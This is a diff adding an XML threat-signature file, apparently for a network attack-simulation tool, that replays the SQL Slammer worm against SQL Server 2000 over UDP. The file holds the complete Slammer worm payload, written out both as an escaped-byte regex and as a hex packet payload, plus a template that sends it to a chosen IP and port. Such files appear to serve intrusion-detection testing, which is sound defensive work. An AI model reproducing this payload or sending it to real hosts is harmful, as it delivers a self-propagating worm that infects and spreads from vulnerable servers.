@@ -1,0 +1,74 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="SQL Slammer"/>
+    <EngDesc display="true" value="This threat is a clone of the SQL Slammer worm. Slammer uses the vulnerability described in MS02-039 to infect hosts. This threat will infect a vulnerable host with the SQL Slammer worm and propagate."/>
+    <Intent display="true">
+      <item value="Infection"/>
+    </Intent>
+    <Protocol display="true" value="MSSQL"/>
+    <Type_Of_Equipment display="true">
+      <item value="Database"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="SQL_Server"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="SQL_Server_2000"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.sans.org/resources/malwarefaq/ms-sql-exploit.php"/>
+    <CVEID display="true" value="CVE-2002-0649"/>
+    <bugtraqID display="true" value="5311"/>
+    <OSVDB display="true" value="4578"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="000000ff4650690800a900fe009b00c91745c29a"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="none"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632742201056562500"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="UDP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X04\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\X01\Xdc\Xc9\Xb0\X42\Xeb\X0e\X01\X01\X01\X01\X01\X01\X01\X70\Xae\X42\X01\X70\Xae\X42\X90\X90\X90\X90\X90\X90\X90\X90\X68\Xdc\Xc9\Xb0\X42\Xb8\X01\X01\X01\X01\X31\Xc9\Xb1\X18\X50\Xe2\Xfd\X35\X01\X01\X01\X05\X50\X89\Xe5\X51\X68\X2e\X64\X6c\X6c\X68\X65\X6c\X33\X32\X68\X6b\X65\X72\X6e\X51\X68\X6f\X75\X6e\X74\X68\X69\X63\X6b\X43\X68\X47\X65\X74\X54\X66\Xb9\X6c\X6c\X51\X68\X33\X32\X2e\X64\X68\X77\X73\X32\X5f\X66\Xb9\X65\X74\X51\X68\X73\X6f\X63\X6b\X66\Xb9\X74\X6f\X51\X68\X73\X65\X6e\X64\Xbe\X18\X10\Xae\X42\X8d\X45\Xd4\X50\Xff\X16\X50\X8d\X45\Xe0\X50\X8d\X45\Xf0\X50\Xff\X16\X50\Xbe\X10\X10\Xae\X42\X8b\X1e\X8b\X03\X3d\X55\X8b\Xec\X51\X74\X05\Xbe\X1c\X10\Xae\X42\Xff\X16\Xff\Xd0\X31\Xc9\X51\X51\X50\X81\Xf1\X03\X01\X04\X9b\X81\Xf1\X01\X01\X01\X01\X51\X8d\X45\Xcc\X50\X8b\X45\Xc0\X50\Xff\X16\X6a\X11\X6a\X02\X6a\X02\Xff\Xd0\X50\X8d\X45\Xc4\X50\X8b\X45\Xc0\X50\Xff\X16\X89\Xc6\X09\Xdb\X81\Xf3\X3c\X61\Xd9\Xff\X8b\X45\Xb4\X8d\X0c\X40\X8d\X14\X88\Xc1\Xe2\X04\X01\Xc2\Xc1\Xe2\X08\X29\Xc2\X8d\X04\X90\X01\Xd8\X89\X45\Xb4\X6a\X10\X8d\X45\Xb0\X50\X31\Xc9\X51\X66\X81\Xf1\X78\X01\X51\X8d\X45\X03\X50\X8b\X45\Xac\X50\Xff\Xd6\Xeb\Xca"/>
+    <Created value="1139462454" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="MSSQLdestPort" type="ImperfectControls.Port" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="@random(0,FFFF)" FragmentOffset="0" TTL="40" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <UDP srcPort="@random(1025,65535)" destPort="$MSSQLdestPort" checksum="" length="" Payload="04010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101dcc9b042eb0e0101010101010170ae420170ae42909090909090909068dcc9b042b80101010131c9b11850e2fd35010101055089e551682e646c6c68656c3332686b65726e51686f756e746869636b43684765745466b96c6c516833322e64687773325f66b965745168736f636b66b9746f516873656e64be1810ae428d45d450ff16508d45e0508d45f050ff1650be1010ae428b1e8b033d558bec517405be1c10ae42ff16ffd031c951515081f10301049b81f101010101518d45cc508b45c050ff166a116a026a02ffd0508d45c4508b45c050ff1689c609db81f33c61d9ff8b45b48d0c408d1488c1e20401c2c1e20829c28d049001d88945b46a108d45b05031c9516681f17801518d4503508b45ac50ffd6ebca"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
